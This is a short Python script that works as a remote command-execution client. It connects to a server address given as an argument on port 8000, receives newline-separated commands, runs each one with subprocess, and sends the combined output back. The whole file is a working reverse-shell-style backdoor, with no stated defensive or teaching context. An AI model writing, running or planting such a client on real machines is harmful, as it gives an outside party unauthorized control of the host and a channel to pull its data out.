from socket import *
import sys
from subprocess import *

serverIP = sys.argv[1]
serverPort = 8000

clientSocket = socket(AF_INET, SOCK_STREAM)
clientSocket.connect((serverIP, serverPort))
clientSocket.send(b"ready")

output = b''
command = clientSocket.recv(4096).decode()

for el in command.strip().split('\n'):
  cmd = el.strip().split()
  proc = Popen(cmd, stderr=PIPE, stdout=PIPE)
  result = proc.communicate()
  output += result[0] + result[1]


clientSocket.send(output)
clientSocket.close()
